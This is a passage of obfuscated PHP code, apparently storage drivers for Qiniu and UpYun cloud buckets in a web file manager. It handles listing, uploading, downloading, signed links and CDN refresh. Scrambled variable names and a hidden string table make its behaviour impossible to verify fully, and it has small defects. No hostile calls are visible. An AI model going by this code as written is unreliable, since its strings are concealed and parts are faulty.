$Œ‡¹êò[$Õ¹¯½ğ[232]] = $Œ‡¹êò[$Õ¹¯½ğ[233]] = !0; $£à÷¾™Ô = rtrim($£à÷¾™Ô, $Õ¹¯½ğ[8]) . $Õ¹¯½ğ[8]; $œµü¡ßí = $this->objectMeta($£à÷¾™Ô); if (isset($œµü¡ßí[$Õ¹¯½ğ[1512]])) { $Œ‡¹êò[$Õ¹¯½ğ[88]] = substr($œµü¡ßí[$Õ¹¯½ğ[1512]] . $Õ¹¯½ğ[12], 0, 10); } return $Œ‡¹êò; } public function listPath($Û£¢¥¹„, $™Ôİ¿– = false) { $üîñóåœ =& $_SERVER[£ğ°ÖØø]; $‚Ú¼êÄ» = $this->fileList($Û£¢¥¹„, $üîñóåœ[8], !0); foreach ($‚Ú¼êÄ»[$üîñóåœ[85]] as $ûù–ğé— => $Ô“Ø‹—ô) { $‚Ú¼êÄ»[$üîñóåœ[85]][$ûù–ğé—] = $this->folderInfo($Ô“Ø‹—ô, $™Ôİ¿–); } foreach ($‚Ú¼êÄ»[$üîñóåœ[86]] as $ûù–ğé— => $Ô“Ø‹—ô) { $‚Ú¼êÄ»[$üîñóåœ[86]][$ûù–ğé—] = $this->fileInfo($Ô“Ø‹—ô[$üîñóåœ[97]], $™Ôİ¿–, $Ô“Ø‹—ô); } return $‚Ú¼êÄ»; } public function has($†ˆÔ›ê, $¹¥æç‘Ê = false, $°ò™Ç«ç = true) { $œ›Ö³ =& $_SERVER[£ğ°ÖØø]; $†ˆÔ›ê = trim($†ˆÔ›ê, $œ›Ö³[8]); $‡™–†Á¶ = empty($†ˆÔ›ê) && $†ˆÔ›ê !== $œ›Ö³[228] ? $œ›Ö³[12] : $†ˆÔ›ê . $œ›Ö³[8]; $Æî´â‚ = $œ›Ö³[12]; $ûªÂÑÈ½ = 500; $Œñá˜óÍ = $œ›Ö³[8]; $‘­šû×Ù = $ ³ÓúÉó = 0; while (!0) { check_abort(); list($ûø·ÀÒ×, $íùĞú) = $this->bucketManager->listFiles($this->bucket, $‡™–†Á¶, $Æî´â‚, $ûªÂÑÈ½, $Œñá˜óÍ); if ($íùĞú) { break; } $Æî´â‚ = array_key_exists($œ›Ö³[1457], $ûø·ÀÒ×) ? $Æî´â‚ = $ûø·ÀÒ×[$œ›Ö³[1513]] : $œ›Ö³[12]; if ($¹¥æç‘Ê) { if (!empty($ûø·ÀÒ×[$œ›Ö³[1514]])) { $‘­šû×Ù += count($ûø·ÀÒ×[$œ›Ö³[1514]]); } if (!empty($ûø·ÀÒ×[$œ›Ö³[1515]])) { $ ³ÓúÉó += count($ûø·ÀÒ×[$œ›Ö³[1515]]); } if ($Æî´â‚ === $œ›Ö³[12]) { break; } continue; } if ($°ò™Ç«ç) { if (!empty($ûø·ÀÒ×[$œ›Ö³[1514]])) { return !0; } } else { if (!empty($ûø·ÀÒ×[$œ›Ö³[1515]])) { return !0; } } if ($Æî´â‚ === $œ›Ö³[12]) { break; } } if ($¹¥æç‘Ê) { return array($œ›Ö³[239] => $‘­šû×Ù, $œ›Ö³[240] => $ ³ÓúÉó); } return !1; } public function listAll($ªåŒÈó) { $ËÖŸÇĞŞ =& $_SERVER[£ğ°ÖØø]; $ÄªœÔÙÚ = $this->fileList($ªåŒÈó, $ËÖŸÇĞŞ[12], !0); $Œ¾…Ö = array_to_keyvalue($ÄªœÔÙÚ[$ËÖŸÇĞŞ[86]], $ËÖŸÇĞŞ[32]); foreach ($ÄªœÔÙÚ[$ËÖŸÇĞŞ[85]] as $Õí®şêõ) { if (is_string($Õí®şêõ)) { $Œ¾…Ö[$Õí®şêõ] = array($ËÖŸÇĞŞ[79] => 0); } } return $this->listAllFiles($ªåŒÈó, $Œ¾…Ö); } private function fileList($äŸÊÔßÙ, $½‹ŠÕµá = '', $’˜„º“ = 0) { $öÜ§¹Î =& $_SERVER[£ğ°ÖØø]; $äŸÊÔßÙ = trim($äŸÊÔßÙ, $öÜ§¹Î[8]); $İÂ¾¾Û = empty($äŸÊÔßÙ) && $äŸÊÔßÙ !== $öÜ§¹Î[228] ? $öÜ§¹Î[12] : $äŸÊÔßÙ . $öÜ§¹Î[8]; $ãõÈÓõ² = $öÜ§¹Î[12]; $Ãàˆ’ñÒ = 1000; $Ê£‡¨É· = $¢ÙÕÙ˜ó = array(); while (!0) { check_abort(); list($¹Øé´òÔ, $ÑÉ¶ƒÅô) = $this->bucketManager->listFiles($this->bucket, $İÂ¾¾Û, $ãõÈÓõ², $Ãàˆ’ñÒ, $½‹ŠÕµá); if ($ÑÉ¶ƒÅô) { break; } $ãõÈÓõ² = array_key_exists($öÜ§¹Î[1457], $¹Øé´òÔ) ? $ãõÈÓõ² = $¹Øé´òÔ[$öÜ§¹Î[1513]] : $öÜ§¹Î[12]; $ı³Şñ€Ó = isset($¹Øé´òÔ[$öÜ§¹Î[1514]]) ? $¹Øé´òÔ[$öÜ§¹Î[1514]] : array(); $Âá³ì‚ = isset($¹Øé´òÔ[$öÜ§¹Î[1515]]) ? $¹Øé´òÔ[$öÜ§¹Î[1515]] : array(); foreach ($ı³Şñ€Ó as $Ó ‘ãÛ†) { if ($Ó ‘ãÛ†[$öÜ§¹Î[97]] == $İÂ¾¾Û) { continue; } $Û‡ò‰¯Ü = $Ó ‘ãÛ†[$öÜ§¹Î[97]]; $„î –îÆ = $Ó ‘ãÛ†[$öÜ§¹Î[1511]]; $Ó ‘ãÛ†[$öÜ§¹Î[79]] = $„î –îÆ; $Í„¥§Ü… = $„î –îÆ == 0 && substr($Û‡ò‰¯Ü, strlen($Û‡ò‰¯Ü) - 1, 1) == $öÜ§¹Î[8] ? !0 : !1; $this->cacheMethodInfoSet($Û‡ò‰¯Ü, $Í„¥§Ü…, $Ó ‘ãÛ†); if ($Í„¥§Ü…) { $Ê£‡¨É·[] = $Û‡ò‰¯Ü; continue; } $¢ÙÕÙ˜ó[] = $’˜„º“ ? $Ó ‘ãÛ† : $Û‡ò‰¯Ü; } foreach ($Âá³ì‚ as $Û‡ò‰¯Ü) { if ($Û‡ò‰¯Ü == $İÂ¾¾Û) { continue; } $Ê£‡¨É·[] = $Û‡ò‰¯Ü; $this->cacheMethodInfoSet($Û‡ò‰¯Ü, !0); } if ($ãõÈÓõ² === $öÜ§¹Î[12]) { break; } } $this->cacheMethodInfoSet($äŸÊÔßÙ, !0); return array($öÜ§¹Î[85] => $Ê£‡¨É·, $öÜ§¹Î[86] => $¢ÙÕÙ˜ó); } public function canRead($ÔØªÉã) { return $this->exist($ÔØªÉã) ? !0 : !1; } public function canWrite($µÍ›ìßø) { return $this->exist($µÍ›ìßø) ? !0 : !1; } public function getContent($´ã‘Ãç) { return $this->fileSubstr($´ã‘Ãç, 0, -1); } public function setContent($’ªÉ¡ª, $Ü­ºÇÓæ = '') { $ãİóáÓƒ = $this->tempFile($this->pathThis($’ªÉ¡ª)); file_put_contents($ãİóáÓƒ, $Ü­ºÇÓæ); if ($this->upload($’ªÉ¡ª, $ãİóáÓƒ)) { $this->tempFileRemve($ãİóáÓƒ); return !0; } return !1; } public function refreshUrls($Ä®Ñ³º) { $ÉÛ¼À›« =& $_SERVER[£ğ°ÖØø]; $¾ÙÆÆ˜ß = array(); if (is_array($Ä®Ñ³º)) { foreach ($Ä®Ñ³º as $ª×’İÓ‘) { $¾ÙÆÆ˜ß[] = $this->link($ª×’İÓ‘); } } else { $¾ÙÆÆ˜ß[] = $this->link($Ä®Ñ³º); } $“ÈçÖ›” = new Qiniu\Cdn\CdnManager($this->auth); list($õ¶âÂİä, $¿å¸¨š„) = $“ÈçÖ›”->refreshUrls($¾ÙÆÆ˜ß); if ($¿å¸¨š„) { return !1; } return $õ¶âÂİä[$ÉÛ¼À›«[1247]] == $ÉÛ¼À›«[823] ? !0 : !1; } public function fileSubstr($¨˜ËŞ®¤, $šÂó‰è, $×óØ´¡) { $”ÓíÌ— =& $_SERVER[£ğ°ÖØø]; if (!($Æ†íÔŸı = $this->link($¨˜ËŞ®¤))) { return !1; } $•¡ìƒè = !1; if ($×óØ´¡ > 0) { $´ˆµüæ = $šÂó‰è + $×óØ´¡ - 1; $•¡ìƒè = array($”ÓíÌ—[1516] . $šÂó‰è . $”ÓíÌ—[471] . $´ˆµüæ); } $ÍŞğ×Ó = url_request($Æ†íÔŸı, $”ÓíÌ—[261], !1, $•¡ìƒè); return $ÍŞğ×Ó[$”ÓíÌ—[814]] ? $ÍŞğ×Ó[$”ÓíÌ—[1270]] : !1; } public function upload($ÙåÔéê¤, $¤¨øƒâ, $×…¾¥ = false, $£»ÛûÆ– = REPEAT_REPLACE) { $Ô³İ‘Û” = new Qiniu\Storage\UploadManager(); $‹¥Á¯øı = $this->auth->uploadToken($this->bucket, $ÙåÔéê¤); $öˆø¥ö = get_file_mime(get_path_ext($¤¨øƒâ)); list($¾†¯‹¸Ÿ, $¡Œ˜ıŠ–) = $Ô³İ‘Û”->putFile($‹¥Á¯øı, $ÙåÔéê¤, $¤¨øƒâ, null, $öˆø¥ö); return $¡Œ˜ıŠ– ? !1 : $this->getPathOuter($ÙåÔéê¤); } public function uploadFormData($„ÓäÍğ¥, $ãÅûîğ = 3600) { return $this->uploadToken($„ÓäÍğ¥, $ãÅûîğ); } public function multiUploadFormData($Ïé ³“, $š€ÉÙæ¬ = 3600) { return $this->uploadToken($Ïé ³“, $š€ÉÙæ¬); } private function uploadToken($ıÙâ¿æó, $›ñş„æ¨ = 3600) { $ğàêœ™¢ =& $_SERVER[£ğ°ÖØø]; $ÀáÂØ = $›ñş„æ¨; $¨ò´ãñ¸ = array($ğàêœ™¢[1517] => $ğàêœ™¢[1518]); $ÜÂÑ–ÜÑ = $ıÙâ¿æó; $‡ÜÚÔ = $this->auth->uploadToken($this->bucket, $ÜÂÑ–ÜÑ, $ÀáÂØ, $¨ò´ãñ¸, !0); $ˆüØ³ˆØ = empty($this->region) || $this->region == $ğàêœ™¢[1519] ? $ğàêœ™¢[12] : $ğàêœ™¢[471] . $this->region; $èèæÏí… = http_type() . "\72\57\57\165\x70\154\157\x61\144{$ˆüØ³ˆØ}\56\x71\x69\x6e\151\x75\x70\56\143\157\155\57"; return array($ğàêœ™¢[1520] => $‡ÜÚÔ, $ğàêœ™¢[1521] => $èèæÏí…); } public function download($ ûšÊÃˆ, $ˆÆò•·Ï) { $ºŒøÀŠÊ = IO::getPathInner(IO::mkfile($ˆÆò•·Ï)); if (!($ÉÕÁ´® = $this->link($ ûšÊÃˆ))) { return !1; } $Ğãšóâá = 0; $ĞÑ¥ƒ¾Ì = 1024 * 200; $ÇÆ»Ï™· = fopen($ºŒøÀŠÊ, $_SERVER[£ğ°ÖØø][1522]); while (!0) { $éÙúãÎ = $this->fileSubstr($ ûšÊÃˆ, $Ğãšóâá, $ĞÑ¥ƒ¾Ì); if ($éÙúãÎ === !1) { return !1; } fwrite($ÇÆ»Ï™·, $éÙúãÎ); $Ğãšóâá += $ĞÑ¥ƒ¾Ì; if (strlen($éÙúãÎ) < $ĞÑ¥ƒ¾Ì) { break; } } fclose($ÇÆ»Ï™·); return $ˆÆò•·Ï; } public function link($ãî»•¨ğ, $œò”õĞ« = '') { if (!$this->isFile($ãî»•¨ğ)) { return !1; } $ÜÆ´–ˆ§ = $this->getHost() . $_SERVER[£ğ°ÖØø][8] . $this->pathEncode($ãî»•¨ğ) . $œò”õĞ«; return $this->auth->privateDownloadUrl($ÜÆ´–ˆ§, 3600 * 12); } public function fileOut($Üä·æ†ì, $ÃÖ‘¿õÔ = false, $Œ“Œ€ú´ = false, $ÚÍàüÌÕ = '') { $×Êá¨ó =& $_SERVER[£ğ°ÖØø]; if ($this->isFileOutServer()) { return $this->fileOutServer($Üä·æ†ì, $ÃÖ‘¿õÔ, $Œ“Œ€ú´, $ÚÍàüÌÕ); } if (!$Œ“Œ€ú´) { $Œ“Œ€ú´ = $this->pathThis($Üä·æ†ì); } $Óäïäö = $ÃÖ‘¿õÔ ? $×Êá¨ó[1523] . rawurlencode($Œ“Œ€ú´) : $×Êá¨ó[12]; $¼‡÷­›¨ = $this->link($Üä·æ†ì, $Óäïäö); $this->fileOutLink($¼‡÷­›¨); } public function fileOutServer($½°¬¿—¿, $ÇÇƒÓñ¦ = false, $À•ø×Îù = false, $¼ëÇÂ®Û = '') { parent::fileOut($½°¬¿—¿, $ÇÇƒÓñ¦, $À•ø×Îù, $¼ëÇÂ®Û); } public function fileOutImage($Òïä™ú´, $ôÛ¤—À = 250) { if ($this->size($Òïä™ú´) > 1024 * 1024 * 20) { return $this->fileOutImageServer($Òïä™ú´, $ôÛ¤—À); } $ ÌÛ¶¿ò = $this->link($Òïä™ú´, $_SERVER[£ğ°ÖØø][1524] . $ôÛ¤—À); $this->fileOutLink($ ÌÛ¶¿ò); } public function fileOutImageServer($É¥äÇ¾, $Ä€ó‰•¢ = 250) { parent::fileOutImage($É¥äÇ¾, $Ä€ó‰•¢); } public function hashMd5($Ÿ¶ÒÖ) { $Õ²²Û =& $_SERVER[£ğ°ÖØø]; $ËÁÙÒ‘Ù = $this->objectMeta($Ÿ¶ÒÖ); return isset($ËÁÙÒ‘Ù[$Õ²²Û[245]]) ? $ËÁÙÒ‘Ù[$Õ²²Û[245]] : !1; $È±ãÏşê = $this->link($Ÿ¶ÒÖ, $Õ²²Û[1525]); } public function size($ù™ìë¼İ) { $¾ŸøÑ¹Ë = $this->objectMeta($ù™ìë¼İ); return $¾ŸøÑ¹Ë ? $¾ŸøÑ¹Ë[$_SERVER[£ğ°ÖØø][79]] : 0; } public function info($›Ñ¡¿™è) { if ($this->isFolder($›Ñ¡¿™è)) { return $this->folderInfo($›Ñ¡¿™è); } else { if ($this->isFile($›Ñ¡¿™è)) { return $this->fileInfo($›Ñ¡¿™è); } } return !1; } public function exist($Áå›­¹Š) { return $this->isFile($Áå›­¹Š) || $this->isFolder($Áå›­¹Š); } public function isFile($ó²¢™¸µ) { return !$this->isFolder($ó²¢™¸µ) && $this->objectMeta($ó²¢™¸µ); } public function isFolder($ü†ĞæÖò) { return $this->cacheMethod($_SERVER[£ğ°ÖØø][179], $ü†ĞæÖò); } protected function objectMeta($µ¶ô„Ë) { return $this->cacheMethod($_SERVER[£ğ°ÖØø][181], $µ¶ô„Ë); } protected function _objectMeta($˜¸û´£) { $Ãè¾‘Û =& $_SERVER[£ğ°ÖØø]; list($×ø¿Ì¶×, $Ä€“¨ˆ») = $this->bucketManager->stat($this->bucket, $˜¸û´£); if ($×ø¿Ì¶×) { $×ø¿Ì¶×[$Ãè¾‘Û[79]] = intval($×ø¿Ì¶×[$Ãè¾‘Û[1511]]); } return $×ø¿Ì¶×; } protected function _isFolder($çÆ»Âßğ) { $çš„ö¢Ÿ =& $_SERVER[£ğ°ÖØø]; if ($çÆ»Âßğ == $çš„ö¢Ÿ[12] || $çÆ»Âßğ == $çš„ö¢Ÿ[8]) { return !0; } list($Ñø‡ÎŞ—, $‘øå») = $this->bucketManager->listFiles($this->bucket, trim($çÆ»Âßğ, $çš„ö¢Ÿ[8]) . $çš„ö¢Ÿ[8], $çš„ö¢Ÿ[12], 1, $çš„ö¢Ÿ[8]); return !empty($Ñø‡ÎŞ—[$çš„ö¢Ÿ[1514]]) || !empty($Ñø‡ÎŞ—[$çš„ö¢Ÿ[1515]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($Ùøãã, $„Ù ÆŞ± = 0) { parent::__construct(); $this->source = $Ùøãã; $this->sourceSize = $„Ù ÆŞ±; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($‡•¬±›µ = false) { return $this->sourceSize; } public function getContent($‡ø”£ò = false) { return $this->fileSubstr($‡ø”£ò, 0, $this->sourceSize); } public function fileSubstr($æ¤Œ… = false, $Ö„ˆ‘‹Ø = 0, $ûäß»¬˜ = 0) { if (!$ûäß»¬˜) { $ûäß»¬˜ = $this->sourceSize; } $ñÕÔö˜ = $this->sourceSize - $Ö„ˆ‘‹Ø; if ($ûäß»¬˜ >= $ñÕÔö˜) { $ûäß»¬˜ = $ñÕÔö˜; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $Ö„ˆ‘‹Ø, $ûäß»¬˜); } if ($this->sourceType == self::TYPE_FILE) { if ($ûäß»¬˜ <= 0) { return $_SERVER[£ğ°ÖØø][12]; } $ÉŠØ­Öú = ftell($this->source); fseek_64($this->source, $ÉŠØ­Öú + $Ö„ˆ‘‹Ø); $ø¾Š”È = @fread($this->source, $ûäß»¬˜); fseek_64($this->source, $ÉŠØ­Öú); return $ø¾Š”È; } } public function hashMd5($ğÆà×ç = false) { return md5($this->getContent()); } public static function hash($¡è°ò‘Š, $íËåÕ× = 0) { $±Íıê¿— = new PathDriverStream($¡è°ò‘Š, $íËåÕ×); return $±Íıê¿—->hashSimple($¡è°ò‘Š); } public static function md5($ û±Áøç, $ÄÉ½¯óˆ = 0) { $ÎŞÖ±İ– = new PathDriverStream($ û±Áøç, $ÄÉ½¯óˆ); return $ÎŞÖ±İ–->hashMd5($ û±Áøç); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\x74\x70\x3a\x2f\x2f\x76\60\x2e\141\x70\x69\x2e\165\160\171\165\156\56\x63\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($©¬÷ˆÖ) { parent::__construct(); $this->_init($©¬÷ˆÖ); } public function _init($Ò”Áü²¤) { $©Ì¯¦Â¹ =& $_SERVER[£ğ°ÖØø]; foreach ($Ò”Áü²¤ as $‘—æ¯İ => $¶²•Ö€™) { if (isset($this->{$‘—æ¯İ})) { $this->{$‘—æ¯İ} = $¶²•Ö€™; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($©Ì¯¦Â¹[1526] . LNG($©Ì¯¦Â¹[1445])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($°•èÉä, $±¢×ìŞ = "\107\x45\124") { $áÛªÕìß =& $_SERVER[£ğ°ÖØø]; $óÉÂş®­ = gmdate($áÛªÕìß[1474]); $ÈşÊíøÍ = base64_encode(hash_hmac($áÛªÕìß[1527], "{$±¢×ìŞ}\46{$°•èÉä}\46{$óÉÂş®­}", md5("{$this->userpass}"), !0)); $›É¾îƒ” = array("\x41\x75\164\150\x6f\x72\x69\172\141\164\151\x6f\156\72\125\x50\131\x55\116\40{$this->username}\x3a{$ÈşÊíøÍ}", "\x44\x61\164\x65\x3a{$óÉÂş®­}"); return $›É¾îƒ”; } public function ussRequest($Ê°ºÛıÊ, $§¦³Ôü× = "\x47\105\x54", $òÌê¯¾Â = false, $¸¿òÉ‚Ï = false, $„¡Ò–Ì¼ = false) { $«òË =& $_SERVER[£ğ°ÖØø]; $Ê°ºÛıÊ = trim($Ê°ºÛıÊ, $«òË[8]); $Ë¶ëş… = "\57{$this->bucket}\x2f{$Ê°ºÛıÊ}"; $â˜ï¨µÅ = $this->ussHeaders($Ë¶ëş…, $§¦³Ôü×); if ($¸¿òÉ‚Ï) { $â˜ï¨µÅ = array_merge($â˜ï¨µÅ, $¸¿òÉ‚Ï); } $Üêß¹˜ = url_request($this->endpoint . $Ë¶ëş…, $§¦³Ôü×, $òÌê¯¾Â, $â˜ï¨µÅ, $„¡Ò–Ì¼); if (!$Üêß¹˜) { $Ç¸î¤¾Ù = LNG($«òË[1528]); $this->writeLog($Ç¸î¤¾Ù); return array($«òË[1280] => !1, $«òË[1270] => $Ç¸î¤¾Ù); } if (strtolower($§¦³Ôü×) == $«òË[227] || in_array($Üêß¹˜[$«òË[1280]], array($«òË[274], $«òË[1529]))) { $òÌê¯¾Â = $Üêß¹˜[$«òË[1530]]; } else { $òÌê¯¾Â = json_decode($Üêß¹˜[$«òË[1270]], !0); if (!$òÌê¯¾Â) { $òÌê¯¾Â = $Üêß¹˜[$«òË[1270]]; } else { if (!$Üêß¹˜[$«òË[814]] && isset($òÌê¯¾Â[$«òË[1531]])) { $òÌê¯¾Â = $òÌê¯¾Â[$«òË[1531]]; } } } if (!$Üêß¹˜[$«òË[814]]) { $this->writeLog($this->__errorMessage($òÌê¯¾Â)); } return array($«òË[1280] => $Üêß¹˜[$«òË[814]], $«òË[1270] => $òÌê¯¾Â); } private function __errorMessage($¥äúæŠŒ) { $´ˆ¡Úäò =& $_SERVER[£ğ°ÖØø]; if (!$¥äúæŠŒ) { return $´ˆ¡Úäò[12]; } static $‚îÙ¾ğ = null; if (!$‚îÙ¾ğ) { $‚îÙ¾ğ = I18n::getType(); } if ($‚îÙ¾ğ != $´ˆ¡Úäò[1484]) { return $¥äúæŠŒ; } $ìÊß·ê‡ = array($´ˆ¡Úäò[1532] => $´ˆ¡Úäò[1533], $´ˆ¡Úäò[1534] => $´ˆ¡Úäò[1535], $´ˆ¡Úäò[1536] => $´ˆ¡Úäò[1535], $´ˆ¡Úäò[1537] => $´ˆ¡Úäò[1538], $´ˆ¡Úäò[1539] => $´ˆ¡Úäò[1540], $´ˆ¡Úäò[1541] => $´ˆ¡Úäò[1542], $´ˆ¡Úäò[1543] => $´ˆ¡Úäò[1544]); return isset($ìÊß·ê‡[$¥äúæŠŒ]) ? $ìÊß·ê‡[$¥äúæŠŒ] : $¥äúæŠŒ; } public function mkfile($Àò¥Ù, $ƒÀò›ú = '', $ª…ã÷¿à = REPEAT_RENAME) { if ($this->setContent($Àò¥Ù, $ƒÀò›ú)) { return $this->getPathOuter($Àò¥Ù); } return !1; } public function mkdir($˜—©ù¨—, $é»í‰•• = REPEAT_SKIP) { $‹Ù©¡©Û =& $_SERVER[£ğ°ÖØø]; $ÌÅ–ÅÆ× = trim($˜—©ù¨—, $‹Ù©¡©Û[8]); if ($this->_isFolder($ÌÅ–ÅÆ×)) { return $this->getPathOuter($ÌÅ–ÅÆ×); } $ºƒ“§õç = array($‹Ù©¡©Û[1545]); $è”ªø‚ = $this->ussRequest($ÌÅ–ÅÆ×, $‹Ù©¡©Û[257], !1, $ºƒ“§õç); return $è”ªø‚[$‹Ù©¡©Û[1280]] ? $this->getPathOuter($ÌÅ–ÅÆ×) : !1; } public function copyFile($–ç´Ãıñ, $ş‚à²°°) { $’º‘´ÏŠ =& $_SERVER[£ğ°ÖØø]; $ĞüŒß£ = array($’º‘´ÏŠ[1546] . "\57{$this->bucket}\57{$–ç´Ãıñ}", $’º‘´ÏŠ[1547]); $¾ÑÒ„£Ü = $this->ussRequest($ş‚à²°°, $’º‘´ÏŠ[259], !1, $ĞüŒß£); return $¾ÑÒ„£Ü[$’º‘´ÏŠ[1280]] ? !0 : $this->getPathOuter($ş‚à²°°); } public function moveFile($ôô´›Ÿ, $Û”¡Â¨) { $‡»ââŸß =& $_SERVER[£ğ°ÖØø]; $•“‹ó½ = array($‡»ââŸß[1548] . "\57{$this->bucket}\57{$ôô´›Ÿ}", $‡»ââŸß[1547]); $´ÂãÔ… = $this->ussRequest($Û”¡Â¨, $‡»ââŸß[259], !1, $•“‹ó½); return $´ÂãÔ…[$‡»ââŸß[1280]] ? !0 : $this->getPathOuter($Û”¡Â¨); } public function delFile($…¦ˆª…î) { $£€ì£ú =& $_SERVER[£ğ°ÖØø]; $Óî·¶ü™ = $this->ussRequest($…¦ˆª…î, $£€ì£ú[1549]); return $Óî·¶ü™[$£€ì£ú[1280]] ? !0 : !1; } public function delFolder($©ß·ûŠ›) { $‘£”õİÉ =& $_SERVER[£ğ°ÖØø]; if (!$this->exist($©ß·ûŠ›)) { return !0; } $this->listItemCache = !1; $İ„ÖÜÑ = $Ïä±÷‚ª = array(); $this->fileList($©ß·ûŠ›, $İ„ÖÜÑ, $Ïä±÷‚ª, !0); $this->listItemCache = !0; foreach ($Ïä±÷‚ª as $ØìŞââ„) { $Ë×ôÆ©« = $this->ussRequest($ØìŞââ„[$‘£”õİÉ[32]], $‘£”õİÉ[1549]); if (!$Ë×ôÆ©«[$‘£”õİÉ[1280]]) { return !1; } } foreach ($İ„ÖÜÑ as $®ë´Í£) { $Ë×ôÆ©« = $this->ussRequest($®ë´Í£, $‘£”õİÉ[1549]); if (!$Ë×ôÆ©«[$‘£”õİÉ[1280]]) { return !1; } } $Ë×ôÆ©« = $this->ussRequest($©ß·ûŠ›, $‘£”õİÉ[1549]); return $Ë×ôÆ©«[$‘£”õİÉ[1280]]; } public function rename($®²ÍÎş, $‹¾ÓØ‘Ù) { if ($this->isFile($®²ÍÎş)) { $‹¾ÓØ‘Ù = get_path_father($®²ÍÎş) . $‹¾ÓØ‘Ù; return $this->moveFile($®²ÍÎş, $‹¾ÓØ‘Ù); } return $this->renameObject($®²ÍÎş, $‹¾ÓØ‘Ù); } public function fileInfo($äöÎìõÉ, $çğ’Ú÷Í = false, $¥‚õ—» = array()) { $¼úÂ½¹ç =& $_SERVER[£ğ°ÖØø]; $¦Õìß‹¥ = array($¼úÂ½¹ç[32] => $this->pathThis($äöÎìõÉ), $¼úÂ½¹ç[87] => $this->getPathOuter($¼úÂ½¹ç[8] . $äöÎìõÉ), $¼úÂ½¹ç[33] => $¼úÂ½¹ç[230], $¼úÂ½¹ç[79] => isset($¥‚õ—»[$¼úÂ½¹ç[79]]) ? $¥‚õ—»[$¼úÂ½¹ç[79]] : 0, $¼úÂ½¹ç[169] => $this->ext($äöÎìõÉ)); if ($çğ’Ú÷Í) { return $¦Õìß‹¥; } $¦Õìß‹¥[$¼úÂ½¹ç[231]] = $¦Õìß‹¥[$¼úÂ½¹ç[88]] = 0; $¦Õìß‹¥[$¼úÂ½¹ç[232]] = $¦Õìß‹¥[$¼úÂ½¹ç[233]] = !0; if (empty($¥‚õ—»)) { $¥‚õ—» = $this->objectMeta($äöÎìõÉ); if (!$¥‚õ—») { return $¦Õìß‹¥; } } $¦Õìß‹¥[$¼úÂ½¹ç[231]] = intval($¥‚õ—»[$¼úÂ½¹ç[1550]]); $¦Õìß‹¥[$¼úÂ½¹ç[88]] = intval($¥‚õ—»[$¼úÂ½¹ç[1551]]); $¦Õìß‹¥[$¼úÂ½¹ç[79]] = $¥‚õ—»[$¼úÂ½¹ç[79]]; return $¦Õìß‹¥; } public function folderInfo($‹¥µ¾ôÑ, $ê¤ğĞ·¬ = false) { $îŒßøÈ× =& $_SERVER[£ğ°ÖØø]; $á¦ûîĞ‚ = array($îŒßøÈ×[32] => $this->pathThis($‹¥µ¾ôÑ), $îŒßøÈ×[87] => $this->getPathOuter($îŒßøÈ×[8] . $‹¥µ¾ôÑ), $îŒßøÈ×[33] => $îŒßøÈ×[78]); if ($ê¤ğĞ·¬) { return $á¦ûîĞ‚; } $á¦ûîĞ‚[$îŒßøÈ×[231]] = $á¦ûîĞ‚[$îŒßøÈ×[88]] = 0; $á¦ûîĞ‚[$îŒßøÈ×[232]] = $á¦ûîĞ‚[$îŒßøÈ×[233]] = !0; if (empty($üáñ¹¹)) { $üáñ¹¹ = $this->objectMeta($‹¥µ¾ôÑ); if (!$üáñ¹¹) { return $á¦ûîĞ‚; } } $á¦ûîĞ‚[$îŒßøÈ×[231]] = intval($üáñ¹¹[$îŒßøÈ×[1550]]); $á¦ûîĞ‚[$îŒßøÈ×[88]] = intval($üáñ¹¹[$îŒßøÈ×[1551]]); return $á¦ûîĞ‚; } private function listObjs($ò¨È¸‹ö, $ç¦Âù»“ = 0, $ıÓÃÜ¨š = 1000) { $’ı¼¶éò =& $_SERVER[£ğ°ÖØø]; $ÇÔˆ÷…Æ = array($’ı¼¶éò[1552], $’ı¼¶éò[1553] . $ıÓÃÜ¨š); if ($ç¦Âù»“) { $ÇÔˆ÷…Æ[] = $’ı¼¶éò[1554] . $ç¦Âù»“; } $ó™ŠÕµ = $this->ussRequest($ò¨È¸‹ö, $’ı¼¶éò[261], !1, $ÇÔˆ÷…Æ); return !$ó™ŠÕµ[$’ı¼¶éò[1280]] ? !1 : $ó™ŠÕµ[$’ı¼¶éò[1270]]; } private function fileList($â¦ŞŞí¸, &$¤³¹Ù¯š, &$œ³ÍÁÒ, $Ö¶Ãî°ù = false) { $ÍßñŒ¬¨ =& $_SERVER[£ğ°ÖØø]; $Ä“åˆ£ = $ÍßñŒ¬¨[12]; $‘’¼Ş«‰ = 1000; $úÃºÃ‡ñ = rtrim($â¦ŞŞí¸, $ÍßñŒ¬¨[8]) . $ÍßñŒ¬¨[8]; while (!0) { check_abort(); $“¿±äÀú = $this->listObjs($â¦ŞŞí¸, $Ä“åˆ£, $‘’¼Ş«‰); if (!$“¿±äÀú) { return !1; } $Ä“åˆ£ = isset($“¿±äÀú[$ÍßñŒ¬¨[1555]]) ? $“¿±äÀú[$ÍßñŒ¬¨[1555]] : $ÍßñŒ¬¨[12]; $¼¥¼‰ş¶ = isset($“¿±äÀú[$ÍßñŒ¬¨[1556]]) ? $“¿±äÀú[$ÍßñŒ¬¨[1556]] : array(); foreach ($¼¥¼‰ş¶ as $î„¸†£Ò) { $‘¨£´È¨ = $î„¸†£Ò[$ÍßñŒ¬¨[33]] == $ÍßñŒ¬¨[78] ? !0 : !1; $¦ûäÑï© = ltrim($úÃºÃ‡ñ . $î„¸†£Ò[$ÍßñŒ¬¨[32]], $ÍßñŒ¬¨[8]) . ($‘¨£´È¨ ? $ÍßñŒ¬¨[8] : $ÍßñŒ¬¨[12]); $³À¯Çª = array($ÍßñŒ¬¨[32] => $¦ûäÑï©, $ÍßñŒ¬¨[33] => $‘¨£´È¨ ? $ÍßñŒ¬¨[78] : $ÍßñŒ¬¨[230], $ÍßñŒ¬¨[79] => $î„¸†£Ò[$ÍßñŒ¬¨[413]], $ÍßñŒ¬¨[1551] => 